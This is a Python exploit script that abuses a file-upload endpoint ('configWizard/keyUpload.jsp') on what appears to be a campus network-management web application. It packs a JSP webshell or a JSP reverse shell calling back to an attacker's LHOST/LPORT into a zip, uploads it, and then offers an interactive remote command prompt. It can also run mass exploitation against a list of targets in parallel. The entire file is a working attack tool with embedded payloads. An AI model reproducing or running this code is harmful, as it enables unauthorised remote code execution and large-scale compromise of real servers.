import argparse
import zipfile
import requests
import concurrent.futures
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Reverse Shell Payload
revshell_payload = (
    r'<%@page import="java.lang.*"%> <%@page import="java.util.*"%> '
    r'<%@page import="java.io.*"%> <%@page import="java.net.*"%> '
    r'<% class StreamConnector extends Thread { InputStream nJ; OutputStream yc; '
    r'StreamConnector( InputStream nJ, OutputStream yc ) { this.nJ = nJ; this.yc = yc; } '
    r'public void run() { BufferedReader cA = null; BufferedWriter rKM = null; '
    r'try { cA = new BufferedReader( new InputStreamReader( this.nJ ) ); '
    r'rKM = new BufferedWriter( new OutputStreamWriter( this.yc ) ); '
    r'char buffer[] = new char[8192]; int length; '
    r'while( ( length = cA.read( buffer, 0, buffer.length ) ) > 0 ) { '
    r'rKM.write( buffer, 0, length ); rKM.flush(); } } catch( Exception e ){} '
    r'try { if( cA != null ) cA.close(); if( rKM != null ) rKM.close(); } catch( Exception e ){} } } '
    r'try { String ShellPath; if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) { '
    r'ShellPath = new String("/bin/sh"); } else { ShellPath = new String("cmd.exe"); } '
    r'Socket socket = new Socket(  "'
    r'LHOST",LPORT); Process process = Runtime.getRuntime().exec( ShellPath ); '
    r'( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start(); '
    r'( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start(); } catch( Exception e ) {} %>'
)
webshell_payload = r'<%@ page import="java.util.*,java.io.*"%><%%><HTML><BODY><FORM METHOD="GET" NAME="myform" ACTION=""><INPUT TYPE="text" NAME="cmd"><INPUTTYPE="submit" VALUE="Send"></FORM><pre><%if (request.getParameter("cmd") != null) {    out.println("Command: " + request.getParameter("cmd") + "<div>");    Process p;    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));    }    else{        p = Runtime.getRuntime().exec(request.getParameter("cmd"));    }    OutputStream os = p.getOutputStream();    InputStream in = p.getInputStream();    DataInputStream dis = new DataInputStream(in);    String disr = dis.readLine();    while ( disr != null ) {    out.println(disr);    disr = dis.readLine();    }}%><div></pre></BODY></HTML>'


def check_url(url):
    if not url.startswith('http'):
        return 'https://' + url
    return url

def test_webshell(host, webshell_name, cmd="echo 'Balgogan'", silent=False):
    try:
        print("[+] Testing webshell") if not silent else None
        
        requests.get(host + f"/{webshell_name}", verify=False, timeout=20)
        r = requests.get(host + f"/{webshell_name}?cmd={cmd}", verify=False, timeout=20)
        print(r.text.split("<div>")[1].split("</div>")[0].strip()) if not silent else None 
        return True if "Balgogan" in r.text else False
    except requests.exceptions.RequestException:
        return False


def exploit(target, filename, silent=False):
    url = f'{check_url(target)}/configWizard/keyUpload.jsp'
    files = {'key': open('balgo.zip', 'rb')}
    try:
        shell_url = f'{check_url(target)}/{filename}'
        r = requests.post(url, files=files, verify=False)
        if 'SuccessfulUpload' in r.text:
            print(f'[+] Payload successfully delivered to {target}')
            r = requests.get(shell_url, verify=False)
            if r.status_code == 200 and test_webshell(url, filename):
                print(f'[+] {check_url(target)} is vulnerable')
                if not silent:
                    choices = ["y",'']
                    choice = input("Would you like to use the terminal ? [Y/n]")
                    if choice.lower() in choices:
                        while True:
                            cmd = input("[balgo]> $ ")
                            if cmd == "exit":
                                break
                            
                            test_webshell(target, filename, cmd)
        else:
            print(f'[!] Failed to write file to {shell_url}') if not silent else None    
    except requests.exceptions.RequestException as e:
        print(f'[!] Failed to deliver payload to {target}. Error: {e}')



def make_zip(payload, filename):
    fullpath = f'/bsc/campusMgr/ui/ROOT/{filename}'
    with zipfile.ZipFile('balgo.zip', 'w') as zf:
        zf.writestr(fullpath, payload)
    print(f'[+] Created balgo.zip with reverse shell payload')



def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='The IP address of the target', type=str)
    parser.add_argument('-l', '--list', help='List of targets', type=str)
    parser.add_argument('-lh', "--lhost", help='The local host for the reverse shell', type=str)
    parser.add_argument('-lp', "--lport", help='The local port for the reverse shell', type=str)
    args = parser.parse_args()
  
    if args.target or args.list:
        if args.lport and args.lhost:
            revshell_payload.replace('LHOST', args.lhost).replace('LPORT', args.lport)
            make_zip(revshell_payload, 'balgorev.jsp') 
            exploit(args.target, 'balgorev.jsp') 
        else:
            make_zip(webshell_payload, 'balgo.jsp')
            if args.target:
                exploit(args.target, 'balgo.jsp')
            elif args.list:
                with open(args.list, "rb") as targets:
                    executor = concurrent.futures.ProcessPoolExecutor(200)
                    futures = [executor.submit(exploit, target, 'balgo.jsp', silent=True) for target in targets]
                    concurrent.futures.wait(futures)
    else:            
        parser.print_help()
        parser.exit()
       

if __name__ == "__main__":
    main()   
